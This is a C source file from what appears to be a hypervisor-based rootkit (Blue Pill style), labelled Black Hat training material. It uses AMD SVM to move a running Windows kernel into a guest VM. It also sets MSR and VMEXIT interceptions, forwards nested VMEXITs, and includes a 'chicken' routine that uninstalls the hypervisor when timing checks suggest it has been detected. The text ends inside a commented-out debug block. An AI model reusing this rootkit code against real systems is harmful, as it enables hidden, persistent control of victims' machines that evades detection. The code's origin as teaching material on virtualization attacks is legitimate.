/* 
 * Copyright holder: Invisible Things Lab
 * 
 * This software is protected by domestic and International
 * copyright laws. Any use (including publishing and
 * distribution) of this software requires a valid license
 * from the copyright holder.
 *
 * This software is provided for the educational use only
 * during the Black Hat training. This software should not
 * be used on production systems.
 *
 */

#include "svm.h"
#include "chicken.h"

HVM_DEPENDENT	Svm={
	ARCH_SVM,
	SvmIsImplemented,
	SvmInitialize,
	SvmVirtualize,
	SvmShutdown,
	SvmIsNestedEvent,
	SvmDispatchNestedEvent,
	SvmDispatchEvent,
	SvmAdjustRip,
	SvmRegisterTraps
};


ULONG	g_uPrintStuff=0;


static BOOLEAN IsBitSet(ULONG32 v,UCHAR bitNo)
{
	ULONG32 mask = 1<<bitNo;
	
	return (BOOLEAN)((v & mask)!=0);
}


static BOOLEAN NTAPI SvmIsImplemented()
{
	ULONG32 eax, ebx, ecx, edx;


	GetCpuIdInfo (0, &eax, &ebx, &ecx, &edx);
	if (eax < 1) {
		_KdPrint (("SvmIsImplemented(): Extended CPUID functions not implemented\n"));
		return FALSE;
	}
	if (!(ebx == 0x68747541 && ecx == 0x444d4163 && edx == 0x69746e65)) {
		_KdPrint (("SvmIsImplemented(): Not an AMD processor\n"));
		return FALSE;
	}

	GetCpuIdInfo (0x80000000, &eax, &ebx, &ecx, &edx);
	if (eax < 0x80000001) {
		_KdPrint (("SvmIsImplemented(): Extended CPUID functions not implemented\n"));
		return FALSE;
	}
	if (!(ebx == 0x68747541 && ecx == 0x444d4163 && edx == 0x69746e65)) {
		_KdPrint (("SvmIsImplemented(): Not an AMD processor\n"));
		return FALSE;
	}


	GetCpuIdInfo(0x80000001,&eax,&ebx,&ecx,&edx);

	return (BOOLEAN)(IsBitSet(ecx,2));
}


static VOID SvmAdjustRip(PCPU Cpu,PGUEST_REGS GuestRegs,ULONG64 Delta)
{
	if (Cpu)
		Cpu->Svm.OriginalVmcb->rip+=Delta;
	return;
}


NTSTATUS NTAPI SvmEnable()
{
	ULONG64	Efer;


	Efer=MsrRead(MSR_EFER);
	_KdPrint(("SvmEnable(): Current MSR_EFER: 0x%X\n",Efer));

	if (Efer & EFER_SVME) {
		_KdPrint(("SvmEnable(): SVME bit already set\n"));
		return STATUS_UNSUCCESSFUL;
	}

	Efer|=EFER_SVME;
	MsrWrite(MSR_EFER,Efer);	

	Efer=MsrRead(MSR_EFER);
	_KdPrint(("SvmEnable(): MSR_EFER after WRMSR: 0x%X\n",Efer));

	return (Efer & EFER_SVME) ? STATUS_SUCCESS : STATUS_NOT_SUPPORTED;
}


NTSTATUS NTAPI SvmDisable()
{
	ULONG64	Efer;
	PHYSICAL_ADDRESS	PhysAddr;


	PhysAddr.QuadPart=0;

	Efer=MsrRead(MSR_EFER);
	_KdPrint(("SvmDisable(): Current MSR_EFER: 0x%X\n",Efer));
	Efer&=~EFER_SVME;
	MsrWrite(MSR_EFER,Efer);

	// zero the HSA address
	SvmSetHsa(PhysAddr);

	Efer=MsrRead(MSR_EFER);
	_KdPrint(("SvmDisable(): MSR_EFER after WRMSR: 0x%X\n",Efer));

	return STATUS_SUCCESS;
}


VOID NTAPI SvmSetHsa(PHYSICAL_ADDRESS HsaPA)
{
	MsrWrite(MSR_VM_HSAVE_PA,HsaPA.QuadPart);
}


NTSTATUS SvmInitGuestState(
					PCPU Cpu,
					PVOID GuestRip,
					PVOID GuestRsp)
{
	USHORT	Sel;	
	PVOID	GuestGdtBase;
	NTSTATUS	Status;
	PVMCB	Vmcb;


	if (!Cpu || !Cpu->Svm.OriginalVmcb || !Cpu->Svm.OriginalVmcbPA.QuadPart)
		return STATUS_INVALID_PARAMETER;

	SvmVmsave(Cpu->Svm.OriginalVmcbPA);

	_KdPrint(("SvmInitGuestState(): GS_BASE: 0x%p\n",MsrRead(MSR_GS_BASE)));
	_KdPrint(("SvmInitGuestState(): SHADOW_GS_BASE: 0x%p\n",MsrRead(MSR_SHADOW_GS_BASE)));
	_KdPrint(("SvmInitGuestState(): KernGSBase: 0x%p\n",Cpu->Svm.OriginalVmcb->kerngsbase));
	_KdPrint(("SvmInitGuestState(): fs.base: 0x%p\n",Cpu->Svm.OriginalVmcb->fs.base));
	_KdPrint(("SvmInitGuestState(): gs.base: 0x%p\n",Cpu->Svm.OriginalVmcb->gs.base));


	Vmcb=Cpu->Svm.OriginalVmcb;

	Vmcb->idtr.base=GetIdtBase();
	Vmcb->idtr.limit=GetIdtLimit();

	GuestGdtBase=(PVOID)GetGdtBase();
	Vmcb->gdtr.base=(ULONG64)GuestGdtBase;
	Vmcb->gdtr.limit=GetGdtLimit();

	MmCreateMapping(MmGetPhysicalAddress((PVOID)Vmcb->gdtr.base),(PVOID)Vmcb->gdtr.base,FALSE);
	MmCreateMapping(MmGetPhysicalAddress((PVOID)Vmcb->idtr.base),(PVOID)Vmcb->idtr.base,FALSE);

#if 0
	_KdPrint(("SvmInitGuestState(): GDT base = 0x%p, limit = 0x%X\n",Vmcb->gdtr.base,Vmcb->gdtr.limit));
	_KdPrint(("SvmInitGuestState(): IDT base = 0x%p, limit = 0x%X\n",Vmcb->idtr.base,Vmcb->idtr.limit));
#endif

	Status=STATUS_SUCCESS;

	Status|=CmInitializeSegmentSelector(&Vmcb->cs,RegGetCs(),GuestGdtBase);
	Status|=CmInitializeSegmentSelector(&Vmcb->ds,RegGetDs(),GuestGdtBase);
	Status|=CmInitializeSegmentSelector(&Vmcb->es,RegGetEs(),GuestGdtBase);
	Status|=CmInitializeSegmentSelector(&Vmcb->ss,RegGetSs(),GuestGdtBase);

	if (!NT_SUCCESS(Status)) {
		_KdPrint(("SvmInitGuestState(): Failed to initialize segment selectors\n"));
		return STATUS_UNSUCCESSFUL;
	}

	Vmcb->cpl=0;


	Vmcb->efer=MsrRead(MSR_EFER);

	Vmcb->cr0=RegGetCr0();
	Vmcb->cr2=RegGetCr2();
	Vmcb->cr3=RegGetCr3();
	Vmcb->cr4=RegGetCr4();	
	Vmcb->rflags=RegGetRflags();
	Vmcb->dr6=0;
	Vmcb->dr7=0;
	Vmcb->rax=0;

	Vmcb->rip=(ULONG64)GuestRip;
	Vmcb->rsp=(ULONG64)GuestRsp;

	return STATUS_SUCCESS;
}


NTSTATUS NTAPI SvmInterceptMsr(PUCHAR MsrPm,ULONG32 Msr,UCHAR bHowToIntercept,PUCHAR pOldInterceptType)
{
	ULONG	uBitNo,uByteNo;
	ULONG	uMsrPmOffset=0,uMsrNumber;
	UCHAR	bOldInterceptType;


	if (!MsrPm || !pOldInterceptType)
		return STATUS_INVALID_PARAMETER;

	// Valid MSR regions:
	// 
	// MSRPM Byte Offset	MSR Range				Current Usage
	// 000h-7FFh			0000_0000h-0000_1FFFh	Pentium®-compatible MSRs
	// 800h-FFFh			C000_0000h-C000_1FFFh	AMD Sixth Generation x86 Processor MSRs and SYSCALL
	// 1000h-17FFh			C001_0000h-C001_1FFFh	AMD Seventh and Eighth Generation Processor MSRs
	// 1800h-1FFFh			XXXX_XXXX-XXXX_XXXX		reserved

	if ((0x00002000<=Msr && Msr<0xc0000000) ||
		(0xc0002000<=Msr && Msr<0xc0010000) ||
		Msr>=0xc0012000)
		return STATUS_INVALID_PARAMETER;

	if (0xc0000000<=Msr && Msr<0xc0002000)
		uMsrPmOffset=0x800;

	if (0xc0010000<=Msr && Msr<0xc0012000)
		uMsrPmOffset=0x1000;

	uMsrNumber=Msr & 0x1fff;

	bHowToIntercept&=3;	// lower bit is READ, higher is WRITE

	uByteNo=uMsrNumber / 4;
	uBitNo=(uMsrNumber % 4)<<1;

	bOldInterceptType=(MsrPm[uMsrPmOffset+uByteNo]>>uBitNo) & 3;

	MsrPm[uMsrPmOffset+uByteNo]|=(bHowToIntercept<<uBitNo);

	*pOldInterceptType=bOldInterceptType;
	return STATUS_SUCCESS;
}


NTSTATUS SvmInterceptEvent(PVMCB Vmcb,ULONG uVmExitNumber,BOOLEAN bInterceptState,PBOOLEAN pOldInterceptState)
{
	ULONG	uBitNo,uByteNo;


	if (!Vmcb || !pOldInterceptState ||	(uVmExitNumber>MAX_GUEST_VMEXIT))
		return STATUS_INVALID_PARAMETER;

	uByteNo=uVmExitNumber / 8;
	uBitNo=uVmExitNumber % 8;

	*pOldInterceptState=(((((PUCHAR)Vmcb)[uByteNo]>>uBitNo) & 1)!=0);

	if (bInterceptState)
		// set the corresponding bit in the specified VMCB to indicate 
		// we're going to intercept this VMEXIT event
		((PUCHAR)Vmcb)[uByteNo]|=(1<<uBitNo);
	else
		// reset the interception bit
		((PUCHAR)Vmcb)[uByteNo]&=~(1<<uBitNo);


	return STATUS_SUCCESS;
}


NTSTATUS NTAPI SvmInjectEvent(PVMCB Vmcb,UCHAR bVector,UCHAR bType,UCHAR bEv,ULONG32 uErrCode)
{
	EVENTINJ	Evnt;


	if (!Vmcb)
		return STATUS_INVALID_PARAMETER;

	Evnt.UCHARs=0;
	Evnt.fields.vector=bVector;
	Evnt.fields.type=bType;
	Evnt.fields.ev=bEv;
	Evnt.fields.errorcode=uErrCode;
	Evnt.fields.v=1;

	Vmcb->eventinj.UCHARs=Evnt.UCHARs;

	return STATUS_SUCCESS;
}


// this will be called to patch MSRPM of a guest hypervisor to be sure 
// we'll intercept all we need using it
NTSTATUS NTAPI SvmSetupMsrInterceptions(PCPU Cpu,PUCHAR MsrPm)
{
	NTSTATUS	Status;
	PNBP_TRAP	Trap;


	if (!Cpu || !MsrPm)
		return STATUS_INVALID_PARAMETER;


	Trap=(PNBP_TRAP)Cpu->MsrTrapsList.Flink;
	while (Trap!=(PNBP_TRAP)&Cpu->MsrTrapsList) {
		Trap=CONTAINING_RECORD(Trap,NBP_TRAP,le);

		if (Trap->TrapType==TRAP_DISABLED) {
			Trap=(PNBP_TRAP)Trap->le.Flink;
			continue;
		}

		if (Trap->TrapType!=TRAP_MSR) {
			_KdPrint(("SvmSetupMsrInterceptions(): %s (%d) structure found in the MsrTrapsList\n",
				Trap->TrapType==TRAP_GENERAL ? "TRAP_GENERAL" :
				Trap->TrapType==TRAP_IO ? "TRAP_IO" : "Wrong typed",
				Trap->TrapType));
			return STATUS_UNSUCCESSFUL;
		}

		if (!NT_SUCCESS(Status=SvmInterceptMsr(
			MsrPm,
			Trap->Msr.TrappedMsr,
			Trap->Msr.TrappedMsrAccess,
			&Trap->Msr.GuestTrappedMsrAccess)))
			return Status;

		// disable forwarding if there's no access intersection

		Trap->bForwardTrapToGuest=((Trap->Msr.TrappedMsrAccess & Trap->Msr.GuestTrappedMsrAccess)!=0);
/*
		_KdPrint(("SvmSetupMsrInterceptions(): Trapping MSR 0x%08hX %s%s%s, guest traps: %s%s%s\n",
			Trap->Msr.TrappedMsr,
			Trap->Msr.TrappedMsrAccess==0 ? "(OFF)" : "",
			Trap->Msr.TrappedMsrAccess & MSR_INTERCEPT_READ ? "R" : "",
			Trap->Msr.TrappedMsrAccess & MSR_INTERCEPT_WRITE ? "W" : "",
			Trap->Msr.GuestTrappedMsrAccess==0 ? "OFF" : "",
			Trap->Msr.GuestTrappedMsrAccess & MSR_INTERCEPT_READ ? "R" : "",
			Trap->Msr.GuestTrappedMsrAccess & MSR_INTERCEPT_WRITE ? "W" : ""));
*/
		Trap=(PNBP_TRAP)Trap->le.Flink;
	}

	return STATUS_SUCCESS;
}


// this will be called to patch VMCB of a guest hypervisor to be sure 
// we'll intercept all we need using it
NTSTATUS NTAPI SvmSetupGeneralInterceptions(PCPU Cpu,PVMCB Vmcb)
{
	PNBP_TRAP	Trap;
	ULONG	uBitNo,uByteNo;
	BOOLEAN	bOldInterceptState;
	NTSTATUS	Status;


	if (!Cpu || !Vmcb)
		return STATUS_INVALID_PARAMETER;

	if (!IsListEmpty(&Cpu->MsrTrapsList))
		Vmcb->general1_intercepts|=GENERAL1_INTERCEPT_MSR_PROT;

	Trap=(PNBP_TRAP)Cpu->GeneralTrapsList.Flink;
	while (Trap!=(PNBP_TRAP)&Cpu->GeneralTrapsList) {
		Trap=CONTAINING_RECORD(Trap,NBP_TRAP,le);

		if (Trap->TrapType==TRAP_DISABLED) {
			Trap=(PNBP_TRAP)Trap->le.Flink;
			continue;
		}

		if (Trap->TrapType!=TRAP_GENERAL) {
			_KdPrint(("SvmSetupGeneralInterceptions(): %s (%d) structure found in the GeneralTrapsList\n",
				Trap->TrapType==TRAP_MSR ? "TRAP_MSR" :
				Trap->TrapType==TRAP_IO ? "TRAP_IO" : "Wrong typed",
				Trap->TrapType));
			return STATUS_UNSUCCESSFUL;
		}

		if (Trap->General.TrappedVmExit>MAX_GUEST_VMEXIT) {
			// VMEXIT_NPF is unsupported
			Trap=(PNBP_TRAP)Trap->le.Flink;
			continue;
		}

		if (!NT_SUCCESS(Status=SvmInterceptEvent(
			Vmcb,
			Trap->General.TrappedVmExit,
			TRUE,
			&bOldInterceptState)))
			return Status;

		// disable forwarding if guest doesn't want to intercept this
		Trap->bForwardTrapToGuest=bOldInterceptState;
/*
		_KdPrint(("SvmSetupGeneralInterceptions(): Trapping VMEXIT %d, forwarding: %s\n",
			Trap->General.TrappedVmExit,
			Trap->bForwardTrapToGuest ? "ON" : "OFF"));
*/
		Trap=(PNBP_TRAP)Trap->le.Flink;
	}

	return STATUS_SUCCESS;
}


static NTSTATUS SvmSetupControlArea(PCPU Cpu)
{
	PVOID	MsrPm,NestedMsrPm;
	PHYSICAL_ADDRESS	MsrPmPA,NestedMsrPmPA;
	PVMCB	Vmcb;
	NTSTATUS	Status;


	if (!Cpu || !Cpu->Svm.OriginalVmcb)
		return STATUS_INVALID_PARAMETER;

	Vmcb=Cpu->Svm.OriginalVmcb;


	MsrPm=MmAllocateContiguousPages(SVM_MSRPM_SIZE_IN_PAGES,&MsrPmPA);
	if (!MsrPm) {
		_KdPrint(("SvmSetupControlArea(): Failed to allocate memory for original MSRPM\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	NestedMsrPm=MmAllocateContiguousPages(SVM_MSRPM_SIZE_IN_PAGES,&NestedMsrPmPA);
	if (!NestedMsrPm) {
		_KdPrint(("SvmSetupControlArea(): Failed to allocate memory for nested MSRPM\n"));
		return STATUS_INSUFFICIENT_RESOURCES;
	}


	// setup only OriginalMsrPm: NestedMsrPm will be configured when needed
	if (!NT_SUCCESS(Status=SvmSetupMsrInterceptions(Cpu,MsrPm))) {
		_KdPrint(("SvmSetupControlArea(): SvmSetupMsrInterceptions() failed with status 0x%08hX\n",Status));
		return Status;
	}

	// indicate VMEXITs we want to trap
	if (!NT_SUCCESS(Status=SvmSetupGeneralInterceptions(Cpu,Vmcb))) {
		_KdPrint(("SvmSetupControlArea(): SvmSetupGeneralInterceptions() failed with status 0x%08hX\n",Status));
		return Status;
	}

	Cpu->Svm.OriginalMsrPm=MsrPm;
	Cpu->Svm.OriginalMsrPmPA=MsrPmPA;

	Cpu->Svm.NestedMsrPm=NestedMsrPm;
	Cpu->Svm.NestedMsrPmPA=NestedMsrPmPA;

	_KdPrint(("SvmSetupControlArea(): MsrPm VA: 0x%p\n",Cpu->Svm.OriginalMsrPm));
	_KdPrint(("SvmSetupControlArea(): MsrPm PA: 0x%X\n",Cpu->Svm.OriginalMsrPmPA.QuadPart));

	_KdPrint(("SvmSetupControlArea(): Nested MsrPm VA: 0x%p\n",Cpu->Svm.NestedMsrPm));
	_KdPrint(("SvmSetupControlArea(): Nested MsrPm PA: 0x%X\n",Cpu->Svm.NestedMsrPmPA.QuadPart));


	Vmcb->msrpm_base_pa=MsrPmPA.QuadPart;
	Vmcb->guest_asid=1;

	Vmcb->tlb_control=0;


	return STATUS_SUCCESS;
}


// this will be called on main guest interceptions and on nested guest interceptions which are not
// trapped by the guest hv.
static VOID SvmHandleInterception(PCPU Cpu,PGUEST_REGS GuestRegs,PVMCB Vmcb,PUCHAR MsrPm)
{
	NTSTATUS	Status;
	UCHAR	bOldMsrAccess,bCurrentMsrAccess;
	BOOLEAN	bOldInterceptState;
	ULONG32	TrappedMsr;
	PNBP_TRAP	Trap;


	if (!Cpu || !GuestRegs || !Vmcb)
		return;

	// search for a registered trap for this interception
	Status=TrFindRegisteredTrap(Cpu,GuestRegs,Vmcb,&Trap);

	switch (Vmcb->exitcode) {
	case VMEXIT_MSR:

		if (!MsrPm)
			return;

		TrappedMsr=(ULONG32)(GuestRegs->rcx & 0xffffffff);

		if (Vmcb->exitinfo1==(MSR_INTERCEPT_READ>>1))
			bCurrentMsrAccess=MSR_INTERCEPT_READ;
		else
			bCurrentMsrAccess=MSR_INTERCEPT_WRITE;

		// note that HvmFindRegisteredTrap() will return a Trap pointer without checks for intercepted MSR access;
		// i.e. it will return a Trap for R access when current event is WRMSR.

		if (!NT_SUCCESS(Status)) {
			_KdPrint(("SvmHandleInterception(): Failed to find a trap handler for MSR 0x%08hX, status 0x%08hX\n",
				TrappedMsr,
				Status));

			// we couldn't find a corresponding trap handler, remove the interception

			_KdPrint(("SvmHandleInterception(): Disabling interception of this MSR\n"));

			// remove the interception flag for this MSR
			if (!NT_SUCCESS(Status=SvmInterceptMsr(
									MsrPm,
									TrappedMsr,
									0,					// no read, no write interception
									&bOldMsrAccess))) {

					_KdPrint(("SvmHandleInterception(): SvmInterceptMsr() failed with status 0x%08hX\n",Status));
					// adjust the rip because we failed to remove msr interception for some reason
					Vmcb->rip+=2;
			}

			break;
		}

		// we found a trap handler, check the trapped access

		if (!(Trap->Msr.TrappedMsrAccess & bCurrentMsrAccess)) {
			// we don't intercept this MSR access, fix the msrpm and retry the intercepted instruction

			_KdPrint(("SvmHandleInterception(): Current MSR (0x%08hX) %s access is not trapped, disabling interception\n",
				TrappedMsr,
				bCurrentMsrAccess==MSR_INTERCEPT_READ ? "read" : "write"));

			if (!NT_SUCCESS(Status=SvmInterceptMsr(
									MsrPm,
									TrappedMsr,
									Trap->Msr.TrappedMsrAccess,
									&bOldMsrAccess))) {

					_KdPrint(("SvmHandleInterception(): SvmInterceptMsr() failed with status 0x%08hX\n",Status));
					// adjust the rip because we failed to remove msr interception for some reason
					Vmcb->rip+=2;
			}

			break;
		}

		// we have a valid trap handler for this interception, call it

		if (!NT_SUCCESS(Status=TrExecuteMsrTrapHandler(Cpu,GuestRegs,Trap))) {

			_KdPrint(("SvmHandleInterception(): HvmExecuteMsrTrapHandler() failed with status 0x%08hX\n",Status));
			Vmcb->rip+=2;
		}

#ifdef BLUE_CHICKEN
		ChickenAddInterceptTsc (Cpu);
		if (ChickenShouldUninstall(Cpu)) {
			_KdPrint (("SvmHandleInterception(): CPU#%d: Chicken Says to uninstall\n",Cpu->ProcessorNumber));

			// call HvmSetupTimeBomb()
			Hvm->ArchShutdown(Cpu,GuestRegs,TRUE);
		}
#endif

		break;

	case VMEXIT_IOIO:
		// not supported yet, passthrough

	default:

		// it's a general event

		if (!NT_SUCCESS(Status)) {

			_KdPrint(("SvmHandleInterception(): Failed to find a trap handler for VMEXIT %d, status 0x%08hX\n",
				Vmcb->exitcode,
				Status));

			// we couldn't find a corresponding trap handler, remove the interception

			_KdPrint(("SvmHandleInterception(): Disabling interception of this event\n"));

			// remove the interception flag for this event
			if (!NT_SUCCESS(Status=SvmInterceptEvent(
									Vmcb,
									(ULONG)(Vmcb->exitcode),
									FALSE,
									&bOldInterceptState))) {
					_KdPrint(("SvmHandleInterception(): SvmInterceptEvent() failed with status 0x%08hX\n",Status));

					// TODO: adjust rip by the length of current instruction
			}

			break;
		}

		// we found a trap handler

		if (!NT_SUCCESS(Status=TrExecuteGeneralTrapHandler(Cpu,GuestRegs,Trap))) {

			_KdPrint(("SvmHandleInterception(): HvmExecuteGeneralTrapHandler() failed with status 0x%08hX\n",Status));
			Vmcb->rip+=2;

		}
		break;
	}
}

static VOID NTAPI SvmDispatchNestedEvent(PCPU Cpu,PGUEST_REGS GuestRegs)
{
	NTSTATUS	Status;
	PVMCB	GuestVmcb;
	PNBP_TRAP	Trap;
	UCHAR	bTrappedMsrAccess;
	BOOLEAN	bInterceptedByGuest;
	ULONG64	GuestMsrPm;


	if (!Cpu || !GuestRegs)
		return;
/*
	_KdPrint(("SvmDispatchNestedEvent(): CPU#%d: Nested #VMEXIT trapped, PA 0x%p\n",
		Cpu->ProcessorNumber,
		Cpu->Svm.VmcbToContinuePA));
*/
	if (Cpu->Svm.VmcbToContinuePA.QuadPart==Cpu->Svm.NestedVmcbPA.QuadPart) {
/*
		_KdPrint(("SvmDispatchNestedEvent(): CPU#%d: RIP: 0x%p\n",
			Cpu->ProcessorNumber,
			Cpu->Svm.NestedVmcb->rip));

		_KdPrint(("SvmDispatchNestedEvent(): CPU#%d: exitinfo1: 0x%p, exitinfo2: 0x%p\n",
			Cpu->ProcessorNumber,
			Cpu->Svm.NestedVmcb->exitinfo1,
			Cpu->Svm.NestedVmcb->exitinfo2));

		_KdPrint(("SvmDispatchNestedEvent(): GS_BASE: 0x%p\n",MsrRead(MSR_GS_BASE)));
		_KdPrint(("SvmDispatchNestedEvent(): SHADOW_GS_BASE: 0x%p\n",MsrRead(MSR_SHADOW_GS_BASE)));
		_KdPrint(("SvmDispatchNestedEvent(): KernGSBase: 0x%p\n",Cpu->Svm.NestedVmcb->kerngsbase));
		_KdPrint(("SvmDispatchNestedEvent(): efer: 0x%p\n",Cpu->Svm.NestedVmcb->efer));
		_KdPrint(("SvmDispatchNestedEvent(): fs.base: 0x%p\n",Cpu->Svm.NestedVmcb->fs.base));
		_KdPrint(("SvmDispatchNestedEvent(): gs.base: 0x%p\n",Cpu->Svm.NestedVmcb->gs.base));
		_KdPrint(("SvmDispatchNestedEvent(): cr2: 0x%p\n",Cpu->Svm.NestedVmcb->cr2));



		_KdPrint(("SvmDispatchNestedEvent(): es.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->es.sel,Cpu->Svm.NestedVmcb->es.base,Cpu->Svm.NestedVmcb->es.limit));
		_KdPrint(("SvmDispatchNestedEvent(): cs.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->cs.sel,Cpu->Svm.NestedVmcb->cs.base,Cpu->Svm.NestedVmcb->cs.limit));
		_KdPrint(("SvmDispatchNestedEvent(): ss.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->ss.sel,Cpu->Svm.NestedVmcb->ss.base,Cpu->Svm.NestedVmcb->ss.limit));
		_KdPrint(("SvmDispatchNestedEvent(): ds.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->ds.sel,Cpu->Svm.NestedVmcb->ds.base,Cpu->Svm.NestedVmcb->ds.limit));
		_KdPrint(("SvmDispatchNestedEvent(): fs.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->fs.sel,Cpu->Svm.NestedVmcb->fs.base,Cpu->Svm.NestedVmcb->fs.limit));
		_KdPrint(("SvmDispatchNestedEvent(): gs.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->gs.sel,Cpu->Svm.NestedVmcb->gs.base,Cpu->Svm.NestedVmcb->gs.limit));

                                                     
		_KdPrint(("SvmDispatchNestedEvent(): gdtr.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->gdtr.sel,Cpu->Svm.NestedVmcb->gdtr.base,Cpu->Svm.NestedVmcb->gdtr.limit));
		_KdPrint(("SvmDispatchNestedEvent(): ldtr.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->ldtr.sel,Cpu->Svm.NestedVmcb->ldtr.base,Cpu->Svm.NestedVmcb->ldtr.limit));
		_KdPrint(("SvmDispatchNestedEvent(): idtr.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->idtr.sel,Cpu->Svm.NestedVmcb->idtr.base,Cpu->Svm.NestedVmcb->idtr.limit));
		_KdPrint(("SvmDispatchNestedEvent(): tr.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.NestedVmcb->tr.sel,Cpu->Svm.NestedVmcb->tr.base,Cpu->Svm.NestedVmcb->tr.limit));

*/


//		Cpu->Svm.NestedVmcb->cr2=Cpu->Svm.NestedVmcb->exitinfo2;
//		Cpu->Svm.OriginalVmcb->cr2=Cpu->Svm.NestedVmcb->exitinfo2;

//		_KdPrint(("SvmDispatchNestedEvent(): cr2: 0x%p\n",Cpu->Svm.NestedVmcb->cr2));

	}


	// VmcbToContinuePA should be equal to NestedVmcbPA if everything works fine.
	// If they're not equal, this means we let guest run its own VMCB in the past.
	if (Cpu->Svm.VmcbToContinuePA.QuadPart!=Cpu->Svm.NestedVmcbPA.QuadPart) {
		_KdPrint(("SvmDispatchNestedEvent(): Unknown VMCB\n"));
		Cpu->Svm.VmcbToContinuePA=Cpu->Svm.OriginalVmcbPA;
		return;
	}

	Trap=NULL;
	bInterceptedByGuest=FALSE;
	Status=TrFindRegisteredTrap(Cpu,GuestRegs,Cpu->Svm.NestedVmcb,&Trap);

	if (!NT_SUCCESS(Status)) {
		// we don't have a registered trap handler for this interception, call the guest hypervisor.
		// This will also execute on VMEXIT_INVALID.
		bInterceptedByGuest=TRUE;

	} else {
		// we have a registered trap. Check if the guest hv wants to intercept this event too.

		if ((Trap->TrapType==TRAP_GENERAL) && Trap->bForwardTrapToGuest)
			// guest hv intercepts this, continue the guest hypervisor vmexit callback
			bInterceptedByGuest=TRUE;

		if ((Trap->TrapType==TRAP_MSR) && Trap->bForwardTrapToGuest) {

			if (Cpu->Svm.NestedVmcb->exitinfo1==(MSR_INTERCEPT_READ>>1))
				bTrappedMsrAccess=MSR_INTERCEPT_READ;
			else
				bTrappedMsrAccess=MSR_INTERCEPT_WRITE;

			if (Trap->Msr.GuestTrappedMsrAccess & bTrappedMsrAccess)
				// guest hv intercepts this, continue the guest hypervisor vmexit callback
				bInterceptedByGuest=TRUE;
		}
	}

	if (bInterceptedByGuest) {
/*
		if (Cpu->Svm.NestedVmcb->exitcode!=VMEXIT_INVALID) {
			_KdPrint(("SvmDispatchNestedEvent(): Forwarding VMEXIT %d to the guest hv\n",
				Cpu->Svm.NestedVmcb->exitcode));
		} else {
			_KdPrint(("SvmDispatchNestedEvent(): Forwarding VMEXIT_INVALID to the guest hv\n"));
		}
*/
		// let our guest handle a #VMEXIT of its own guest, rip has already been moved after the VMRUN
		Cpu->Svm.VmcbToContinuePA=Cpu->Svm.OriginalVmcbPA;

		// copy current guest's VM state and exit data to its original place

		if (!NT_SUCCESS(Status=CmPatchPTEPhysicalAddress(
			Cpu->SparePagePTE,
			Cpu->SparePage,
			Cpu->Svm.GuestVmcbPA))) {

			_KdPrint(("SvmDispatchNestedEvent(): Failed to map PA 0x%p to VA 0x%p, status 0x%08hX\n",
				Cpu->Svm.OriginalVmcbPA,
				Cpu->SparePage,
				Status));

			return;
		}

		GuestVmcb=Cpu->SparePage;

		// copy VMCB params that might change

		RtlCopyMemory(&GuestVmcb->vintr,&Cpu->Svm.NestedVmcb->vintr,sizeof(VINTR));
		GuestVmcb->interrupt_shadow=Cpu->Svm.NestedVmcb->interrupt_shadow;
		GuestVmcb->exitcode=Cpu->Svm.NestedVmcb->exitcode;
		GuestVmcb->exitinfo1=Cpu->Svm.NestedVmcb->exitinfo1;
		GuestVmcb->exitinfo2=Cpu->Svm.NestedVmcb->exitinfo2;
		RtlCopyMemory(&GuestVmcb->exitintinfo,&Cpu->Svm.NestedVmcb->exitintinfo,sizeof(EVENTINJ));
		RtlCopyMemory(&GuestVmcb->eventinj,&Cpu->Svm.NestedVmcb->eventinj,sizeof(EVENTINJ));

		// copy guest state area

		RtlCopyMemory(&((PUCHAR)GuestVmcb)[0x400],&((PUCHAR)Cpu->Svm.NestedVmcb)[0x400],0xc00);

		// let guest think it's handling a #VMEXIT of its guest

		Cpu->Svm.OriginalVmcb->rax=Cpu->Svm.GuestVmcbPA.QuadPart;
/*

		_KdPrint(("SvmDispatchNestedEvent(): Setting RAX to 0x%p\n",
			Cpu->Svm.OriginalVmcb->rax));



		_KdPrint(("SvmDispatchNestedEvent(): Setting original VMCB.RIP: 0x%p\n",
			Cpu->Svm.OriginalVmcb->rip));
		_KdPrint(("SvmDispatchNestedEvent(): original KernGSBase: 0x%p\n",Cpu->Svm.OriginalVmcb->kerngsbase));
		_KdPrint(("SvmDispatchNestedEvent(): original efer: 0x%p\n",Cpu->Svm.OriginalVmcb->efer));
		_KdPrint(("SvmDispatchNestedEvent(): original fs.base: 0x%p\n",Cpu->Svm.OriginalVmcb->fs.base));
		_KdPrint(("SvmDispatchNestedEvent(): original gs.base: 0x%p\n",Cpu->Svm.OriginalVmcb->gs.base));
		_KdPrint(("SvmDispatchNestedEvent(): original cr2: 0x%p\n",Cpu->Svm.OriginalVmcb->cr2));
		_KdPrint(("SvmDispatchNestedEvent(): original ss.base: 0x%p\n",Cpu->Svm.OriginalVmcb->ss.base));
		_KdPrint(("SvmDispatchNestedEvent(): original rsp: 0x%p\n",Cpu->Svm.OriginalVmcb->rsp));


		_KdPrint(("SvmDispatchNestedEvent(): original es.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->es.sel,Cpu->Svm.OriginalVmcb->es.base,Cpu->Svm.OriginalVmcb->es.limit));
		_KdPrint(("SvmDispatchNestedEvent(): original cs.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->cs.sel,Cpu->Svm.OriginalVmcb->cs.base,Cpu->Svm.OriginalVmcb->cs.limit));
		_KdPrint(("SvmDispatchNestedEvent(): original ss.sel: 0x%x, base: 0x%x, limit 0x%x\n",Cpu->Svm.OriginalVmcb->ss.sel,Cpu->Svm.OriginalVmcb->ss.base,Cpu->Svm.OriginalVmcb->ss.limit));
